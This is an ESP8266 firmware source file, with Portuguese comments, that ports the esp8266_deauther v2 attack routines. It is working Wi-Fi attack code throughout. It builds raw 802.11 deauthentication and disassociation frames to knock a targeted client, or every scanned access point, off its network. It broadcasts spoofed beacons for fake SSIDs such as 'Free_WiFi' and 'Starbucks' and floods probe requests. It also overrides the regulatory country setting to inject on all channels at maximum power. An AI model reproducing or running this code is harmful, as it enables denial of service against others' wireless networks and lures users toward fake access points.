/*
 * Paridade com esp8266_deauther v2: Attack::deauthDevice, sendPacket, sendBeacon,
 * sendProbe, deauthAllUpdate (APs do scan), updateCounter (1 s).
 * Licenca MIT: https://github.com/SpacehuhnTech/esp8266_deauther
 */

#include "deauther.h"

#include <cstring>

#include <ESP8266WiFi.h>
#include "app_state.h"
#include "wifi_portal.h"
#include "wifi_scan.h"

extern "C"
{
#include "user_interface.h"
}

bool deautherRunning = false;
unsigned long deautherPacketsSent = 0;
unsigned long deautherTmpPacketRate = 0;
unsigned long deautherInjectFail = 0;
bool beaconActive = false;
unsigned long beaconPacketsSent = 0;

static bool attackActive = false;
static uint8_t targetApMac[6];
static uint8_t targetClientMac[6];
static uint8_t targetChannel = 1;
static uint8_t attackReason = 1;
static unsigned long lastAttackPacketAt = 0;
static unsigned long lastBeaconTickAt = 0;

static unsigned long s_statsSecondAnchorMs = 0;
static uint32_t s_deauthPacketCounter = 0;
static uint32_t s_tmpPacketRateAccum = 0;

static bool s_attackDeauthAll = false;
static uint8_t s_apBssids[kWifiScanMaxNetworks][6];
static uint8_t s_apChannels[kWifiScanMaxNetworks];
static int s_apSnapCount = 0;
static uint8_t s_deauthTc = 0;
static uint8_t s_beaconTc = 0;
static uint8_t s_probeTc = 0;
static unsigned long s_lastProbeTickAt = 0;

static uint8_t s_wifiChannelCache = 255;
static bool s_staFallbackActive = false;
static uint16_t s_consecutiveInjectFails = 0;
static constexpr uint16_t kStaFallbackFailThreshold = 96;

static void setWifiChannelSh(uint8_t ch, bool force)
{
  if ((((ch != s_wifiChannelCache) || force) && (ch < 15)) && ch >= 1)
  {
    s_wifiChannelCache = ch;
    wifi_set_channel(ch);
  }
}

static void applyInjectionCountry()
{
  wifi_country_t c;
  memset(&c, 0, sizeof(c));
  strncpy(c.cc, "01", 3);
  c.schan = 1;
  c.nchan = 14;
  c.policy = WIFI_COUNTRY_POLICY_MANUAL;
  wifi_set_country(&c);
}

static void switchToStaFallbackForInjection(uint8_t channel)
{
  wifi_promiscuous_enable(0);
  WiFi.mode(WIFI_STA);
  delay(80);
  applyInjectionCountry();
  s_wifiChannelCache = 255;
  if (channel >= 1 && channel <= 14)
  {
    wifi_set_channel(channel);
    s_wifiChannelCache = channel;
  }
  wifi_promiscuous_enable(1);
  s_staFallbackActive = true;
  Serial.println(F("[deauther] fallback RF: WIFI_STA para liberar injetor"));
}

void restoreWifiRegAfterInjection()
{
  wifi_country_t c;
  memset(&c, 0, sizeof(c));
  strncpy(c.cc, "CN", 3);
  c.schan = 1;
  c.nchan = 13;
  c.policy = WIFI_COUNTRY_POLICY_AUTO;
  wifi_set_country(&c);
}

static void rollAttackStatsIfNeeded()
{
  if (!attackActive && !beaconActive && !probeActive)
  {
    return;
  }
  const unsigned long now = millis();
  if (s_statsSecondAnchorMs == 0)
  {
    s_statsSecondAnchorMs = now;
    return;
  }
  while (now - s_statsSecondAnchorMs >= 1000UL)
  {
    deautherPacketsSent = s_deauthPacketCounter;
    deautherTmpPacketRate = s_tmpPacketRateAccum;
    s_deauthPacketCounter = 0;
    s_tmpPacketRateAccum = 0;
    s_statsSecondAnchorMs += 1000UL;
  }
}

static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch, bool force_ch)
{
  setWifiChannelSh(ch, force_ch);
  yield();
  const bool sent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
  if (sent)
  {
    s_tmpPacketRateAccum++;
    s_consecutiveInjectFails = 0;
  }
  else
  {
    deautherInjectFail++;
    if (s_consecutiveInjectFails < 0xFFFF)
    {
      s_consecutiveInjectFails++;
    }
    if (!s_staFallbackActive && s_consecutiveInjectFails >= kStaFallbackFailThreshold)
    {
      switchToStaFallbackForInjection(ch);
      const bool retrySent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
      if (retrySent)
      {
        s_tmpPacketRateAccum++;
        s_consecutiveInjectFails = 0;
        return true;
      }
      deautherInjectFail++;
    }
  }
  return sent;
}

static bool macBroadcast(const uint8_t *mac)
{
  static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  return memcmp(mac, bcast, 6) == 0;
}

static unsigned deauthMaxPktsNow()
{
  int dpt = deautherDeauthsPerTarget;
  if (dpt < 1)
  {
    dpt = 1;
  }
  if (dpt > 255)
  {
    dpt = 255;
  }
  const unsigned dptu = static_cast<unsigned>(dpt);
  if (s_attackDeauthAll)
  {
    const int n = (s_apSnapCount < 1) ? 1 : s_apSnapCount;
    return dptu * static_cast<unsigned>(n);
  }
  const bool clientBcast = macBroadcast(targetClientMac);
  return dptu * (clientBcast ? 1u : 2u);
}

static unsigned long deauthIntervalMs()
{
  const unsigned m = deauthMaxPktsNow();
  return m > 0 ? (1000UL / m) : 40UL;
}

static const uint8_t kBroadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static const struct
{
  const char *ssid;
  uint8_t channel;
  bool wpa2;
} kBeaconRoster[] = {
    {"Free_WiFi", 1, true}, {"Starbucks", 6, true}, {"Airport_Free", 11, true},
    {"NETGEAR_Guest", 1, true}, {"TP-Link_Guest", 6, false}, {"ATT-WIFI", 11, true},
    {"xfinitywifi", 1, false}, {"CableWiFi", 6, true},
};
static constexpr size_t kBeaconRosterCount = sizeof(kBeaconRoster) / sizeof(kBeaconRoster[0]);

/** beaconPacket[109] — Attack.h (Spacehuhn v2). */
static const uint8_t kBeaconTemplate109[109] = {
    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
    0x01, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00,
    0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};

static uint8_t s_probePacket[68] = {
    0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96,
    0x24, 0x30, 0x48, 0x6c};

static bool sendBeaconSpacehuhn(uint8_t tc)
{
  const auto &e = kBeaconRoster[tc % kBeaconRosterCount];
  uint8_t mac[6];
  for (int i = 0; i < 6; i++)
  {
    mac[i] = static_cast<uint8_t>(random(256));
  }
  mac[5] = tc;

  uint8_t bw[109];
  memcpy(bw, kBeaconTemplate109, sizeof(kBeaconTemplate109));
  uint16_t packetSize = sizeof(kBeaconTemplate109);
  if (e.wpa2)
  {
    bw[34] = 0x31;
  }
  else
  {
    bw[34] = 0x21;
    packetSize = static_cast<uint16_t>(packetSize - 26);
  }
  if (deautherBeaconInterval100ms)
  {
    bw[32] = 0x64;
    bw[33] = 0x00;
  }
  else
  {
    bw[32] = 0xe8;
    bw[33] = 0x03;
  }
  int ssidLen = static_cast<int>(strlen(e.ssid));
  if (ssidLen > 32)
  {
    ssidLen = 32;
  }
  memcpy(&bw[10], mac, 6);
  memcpy(&bw[16], mac, 6);
  memcpy(&bw[38], e.ssid, static_cast<size_t>(ssidLen));
  bw[82] = e.channel;

  const uint16_t tmpPacketSize = static_cast<uint16_t>((packetSize - 32) + ssidLen);
  uint8_t tmpStack[120];
  memcpy(&tmpStack[0], &bw[0], static_cast<size_t>(38 + ssidLen));
  tmpStack[37] = static_cast<uint8_t>(ssidLen);
  memcpy(&tmpStack[38 + ssidLen], &bw[70], e.wpa2 ? 39u : 13u);
  return sendPacketSpacehuhn(tmpStack, tmpPacketSize, e.channel, false);
}

static bool sendProbeSpacehuhn(uint8_t *mac, const char *ssid, uint8_t ch)
{
  memcpy(&s_probePacket[10], mac, 6);
  int ssidLen = static_cast<int>(strlen(ssid));
  if (ssidLen > 32)
  {
    ssidLen = 32;
  }
  memset(&s_probePacket[26], 0, 32);
  memcpy(&s_probePacket[26], ssid, static_cast<size_t>(ssidLen));
  s_probePacket[24] = 0x00;
  s_probePacket[25] = 0x20;
  return sendPacketSpacehuhn(s_probePacket, 68, ch, false);
}

static unsigned beaconMaxPktsNow()
{
  const unsigned n = static_cast<unsigned>(kBeaconRosterCount);
  return n * (deautherBeaconInterval100ms ? 10u : 1u);
}

static unsigned long beaconIntervalMs()
{
  const unsigned m = beaconMaxPktsNow();
  return m > 0 ? (1000UL / m) : 100UL;
}

static unsigned probeMaxPktsNow()
{
  const int f = deautherProbeFramesPerSsid < 1 ? 1 : deautherProbeFramesPerSsid;
  return static_cast<unsigned>(kBeaconRosterCount) * static_cast<unsigned>(f);
}

static unsigned long probeIntervalMs()
{
  const unsigned m = probeMaxPktsNow();
  return m > 0 ? (1000UL / m) : 50UL;
}

static const uint8_t kDeauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};

static bool deauthDeviceSpacehuhn(uint8_t *apMac, const uint8_t *stMac, uint8_t reason, uint8_t ch)
{
  if (!stMac)
  {
    return false;
  }

  bool success = false;
  constexpr uint16_t packetSize = 26;

  uint8_t deauthpkt[packetSize];
  memcpy(deauthpkt, kDeauthPacket, packetSize);
  memcpy(&deauthpkt[4], stMac, 6);
  memcpy(&deauthpkt[10], apMac, 6);
  memcpy(&deauthpkt[16], apMac, 6);
  deauthpkt[24] = reason;

  deauthpkt[0] = 0xc0;
  if (sendPacketSpacehuhn(deauthpkt, packetSize, ch, true))
  {
    success = true;
    s_deauthPacketCounter++;
  }

  uint8_t disassocpkt[packetSize];
  memcpy(disassocpkt, deauthpkt, packetSize);
  disassocpkt[0] = 0xa0;
  if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
  {
    success = true;
    s_deauthPacketCounter++;
  }

  if (!macBroadcast(stMac))
  {
    memcpy(&disassocpkt[4], apMac, 6);
    memcpy(&disassocpkt[10], stMac, 6);
    memcpy(&disassocpkt[16], stMac, 6);

    disassocpkt[0] = 0xc0;
    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
    {
      success = true;
      s_deauthPacketCounter++;
    }

    disassocpkt[0] = 0xa0;
    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
    {
      success = true;
      s_deauthPacketCounter++;
    }
  }

  return success;
}

static void prepareRadioForDeauthInjection(uint8_t channel)
{
  wifi_promiscuous_enable(0);
  WiFi.persistent(false);
  WiFi.setAutoReconnect(false);
  WiFi.setSleepMode(WIFI_NONE_SLEEP);

  WiFi.mode(WIFI_AP_STA);
  delay(50);

  wifi_set_phy_mode(PHY_MODE_11N);
  system_phy_set_max_tpw(82);

  applyInjectionCountry();
  s_staFallbackActive = false;
  s_consecutiveInjectFails = 0;

  s_wifiChannelCache = 255;
  if (channel >= 1 && channel <= 14)
  {
    wifi_set_channel(channel);
    s_wifiChannelCache = channel;
  }
  delay(50);
}

void initDeauther()
{
}

static bool parseMacString(const String &macStr, uint8_t out[6])
{
  String s = macStr;
  s.trim();
  s.replace(":", "");
  s.replace("-", "");
  s.toUpperCase();
  if (s.length() != 12)
  {
    return false;
  }
  for (int i = 0; i < 6; i++)
  {
    const String octet = s.substring(i * 2, i * 2 + 2);
    char *end = nullptr;
    const unsigned long v = strtoul(octet.c_str(), &end, 16);
    if (end == octet.c_str() || v > 255)
    {
      return false;
    }
    out[i] = static_cast<uint8_t>(v);
  }
  return true;
}

void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
{
  (void)reason;
  deautherPacketsSent = 0;
  deautherTmpPacketRate = 0;
  deautherInjectFail = 0;
  s_deauthPacketCounter = 0;
  s_tmpPacketRateAccum = 0;
  s_statsSecondAnchorMs = millis();
  s_deauthTc = 0;
  attackReason = static_cast<uint8_t>(deautherDeauthReason & 0xFF);

  if (deautherDeauthAll)
  {
    s_apSnapCount = 0;
    for (int i = 0; i < g_wifiScanNetworkCount && s_apSnapCount < kWifiScanMaxNetworks; i++)
    {
      bool nz = false;
      for (int j = 0; j < 6; j++)
      {
        if (g_wifiScanNetworks[i].bssid[j] != 0)
        {
          nz = true;
          break;
        }
      }
      if (!nz)
      {
        continue;
      }
      memcpy(s_apBssids[s_apSnapCount], g_wifiScanNetworks[i].bssid, 6);
      uint8_t ch = g_wifiScanNetworks[i].channel;
      if (ch < 1 || ch > 14)
      {
        ch = 1;
      }
      s_apChannels[s_apSnapCount] = ch;
      s_apSnapCount++;
    }
    if (s_apSnapCount <= 0)
    {
      Serial.println(
          F("[deauther] deauth_all: nenhum AP com BSSID — escaneie (ecra 5) antes."));
      return;
    }
    s_attackDeauthAll = true;
    prepareRadioForDeauthInjection(s_apChannels[0]);
  }
  else
  {
    if (!apMac || !clientMac)
    {
      return;
    }
    s_attackDeauthAll = false;
    memcpy(targetApMac, apMac, 6);
    memcpy(targetClientMac, clientMac, 6);
    targetChannel = channel;
    prepareRadioForDeauthInjection(targetChannel);
  }

  attackActive = true;
  deautherRunning = true;
  lastAttackPacketAt = millis();
}

void stopDeauthAttack()
{
  attackActive = false;
  deautherRunning = false;
  s_attackDeauthAll = false;
  s_apSnapCount = 0;
  if (!beaconActive && !probeActive)
  {
    s_statsSecondAnchorMs = 0;
  }

  Serial.print(F("[deauther] deauthFrames="));
  Serial.print(deautherPacketsSent);
  Serial.print(F(" tmpPacketRate="));
  Serial.print(deautherTmpPacketRate);
  Serial.print(F(" falha="));
  Serial.println(deautherInjectFail);

  restorePortalWiFiAfterDeauth();
}

void startBeaconAttack()
{
  prepareRadioForDeauthInjection(1);
  s_beaconTc = 0;
  lastBeaconTickAt = millis();
  beaconActive = true;
  if (!attackActive && !probeActive)
  {
    s_statsSecondAnchorMs = millis();
    s_deauthPacketCounter = 0;
    s_tmpPacketRateAccum = 0;
    deautherPacketsSent = 0;
    deautherTmpPacketRate = 0;
  }
  else if (s_statsSecondAnchorMs == 0)
  {
    s_statsSecondAnchorMs = millis();
  }
}

void stopBeaconAttack()
{
  beaconActive = false;
  if (!attackActive && !probeActive)
  {
    s_statsSecondAnchorMs = 0;
  }
  restorePortalWiFiAfterDeauth();
}

void startProbeAttack()
{
  prepareRadioForDeauthInjection(1);
  s_probeTc = 0;
  s_lastProbeTickAt = millis();
  probeActive = true;
  if (!attackActive && !beaconActive)
  {
    s_statsSecondAnchorMs = millis();
    s_deauthPacketCounter = 0;
    s_tmpPacketRateAccum = 0;
    deautherPacketsSent = 0;
    deautherTmpPacketRate = 0;
  }
  else if (s_statsSecondAnchorMs == 0)
  {
    s_statsSecondAnchorMs = millis();
  }
}

void stopProbeAttack()
{
  probeActive = false;
  if (!attackActive && !beaconActive)
  {
    s_statsSecondAnchorMs = 0;
  }
  restorePortalWiFiAfterDeauth();
}

void updateBeacon()
{
  rollAttackStatsIfNeeded();
  if (!beaconActive)
  {
    return;
  }
  const unsigned long now = millis();
  if (now - lastBeaconTickAt < beaconIntervalMs())
  {
    return;
  }
  if (sendBeaconSpacehuhn(s_beaconTc))
  {
    beaconPacketsSent++;
  }
  s_beaconTc++;
  if (s_beaconTc >= kBeaconRosterCount)
  {
    s_beaconTc = 0;
  }
  lastBeaconTickAt = now;
}

void updateProbe()
{
  rollAttackStatsIfNeeded();
  if (!probeActive)
  {
    return;
  }
  const unsigned long now = millis();
  if (now - s_lastProbeTickAt < probeIntervalMs())
  {
    return;
  }
  uint8_t mac[6];
  for (int i = 0; i < 6; i++)
  {
    mac[i] = static_cast<uint8_t>(random(256));
  }
  mac[5] = s_probeTc;
  const size_t idx = s_probeTc % kBeaconRosterCount;
  const uint8_t ch = static_cast<uint8_t>(1 + (s_probeTc % 11));
  if (sendProbeSpacehuhn(mac, kBeaconRoster[idx].ssid, ch))
  {
    probePacketsSent++;
  }
  s_probeTc++;
  s_lastProbeTickAt = now;
}

bool isDeauthActive()
{
  return attackActive;
}

void updateDeauth()
{
  rollAttackStatsIfNeeded();
  if (!attackActive)
  {
    return;
  }
  const unsigned long now = millis();
  if (now - lastAttackPacketAt < deauthIntervalMs())
  {
    return;
  }
  if (s_attackDeauthAll)
  {
    const int n = s_apSnapCount > 0 ? s_apSnapCount : 1;
    const uint8_t idx = static_cast<uint8_t>(s_deauthTc % static_cast<unsigned>(n));
    const bool ok =
        deauthDeviceSpacehuhn(s_apBssids[idx], kBroadcastMac, attackReason, s_apChannels[idx]);
    if (ok)
    {
      lastAttackPacketAt = now;
    }
    s_deauthTc = static_cast<uint8_t>(s_deauthTc + (ok ? 1 : 0));
    if (s_deauthTc >= static_cast<unsigned>(n))
    {
      s_deauthTc = 0;
    }
  }
  else
  {
    if (deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel))
    {
      lastAttackPacketAt = now;
    }
  }
}

void toggleDeauther()
{
  if (attackActive)
  {
    stopDeauthAttack();
    Serial.println("Deauther stopped");
  }
  else
  {
    if (deautherDeauthAll)
    {
      Serial.println(F("[deauther] deauth_all — APs do ultimo scan"));
      startDeauthAttack(nullptr, nullptr, 1, 0);
      if (attackActive)
      {
        Serial.println("Deauther started");
      }
      return;
    }
    uint8_t apMac[6];
    uint8_t clientMac[6];
    if (!parseMacString(deautherApMac, apMac) || !parseMacString(deautherClientMac, clientMac))
    {
      Serial.println(F("[deauther] MAC invalido (12 hex)"));
      return;
    }
    startDeauthAttack(apMac, clientMac, static_cast<uint8_t>(deautherChannel), 0);
    if (attackActive)
    {
      Serial.println("Deauther started");
    }
  }
}